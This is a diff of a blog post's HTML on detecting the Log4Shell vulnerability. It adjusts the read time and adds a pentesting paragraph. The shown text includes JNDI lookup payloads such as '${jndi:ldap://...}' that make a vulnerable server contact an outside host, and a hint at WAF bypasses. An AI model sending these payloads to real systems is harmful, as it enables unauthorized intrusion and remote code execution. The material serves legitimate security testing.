@@ -70,7 +70,7 @@
 
 <p class="post-metadata text-muted">
   11 July 2022 -  
-  <b>4 mins read time</b>
+  <b>5 mins read time</b>
 
   <br>Tags: 
     
@@ -236,6 +236,8 @@ java <span class="nt">-cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marsha
 
 <h1 id="4-detecting-log4shell">4. Detecting Log4Shell</h1>
 <p>Detect log4shell is easy. You only need to use the <code class="language-plaintext highlighter-rouge">${jndi:ldap://www.server-you-control.com}</code> as user inputs to the target server. If there is a ping back or a DNS look up for your server after the payload is sent then there is a high chance that the targe server is vulnerable. In case there is a WAF, it will block this malicious payload but there are a bunch of bypasses on Twitter for each specific WAFs that you can try.</p>
+
+<p>For pentesters, use the <a href="https://portswigger.net/bappstore/b011be53649346dd87276bca41ce8e8f">Burp’s Log4Shell Scanner extension</a> and it will automatically replace request inputs with Log4shell payload that includes the generated burp collaborator urls. If you fancy the manual way, you can replace the payload with burp collaborator and check if there is any traffic coming to it. Example: <code class="language-plaintext highlighter-rouge">${jndi:ldap://test.oastify.com}</code></p>
 
 
 
